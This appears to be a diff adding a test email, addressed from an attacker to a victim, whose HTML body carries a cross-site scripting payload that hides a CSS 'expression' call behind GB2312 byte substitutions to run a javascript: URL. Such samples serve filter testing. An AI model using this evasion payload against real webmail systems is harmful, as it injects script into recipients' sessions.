@@ -1,0 +1,9 @@
+From: <attacker@attacker.com>
+To: victim@hotmail.com
+Subject: example
+MIME-Version: 1.0
+Content-Type: text/html; charset=GB2312
+
+<img id='sss'>
+<input id='ttt' value="javascript:alert('xss')">
+<span style="font-family:[ascii 163][asii 197]xpression[ascii 163][ascii 168]document.all.sss.src=document.all.ttt.value)">exploited</span>
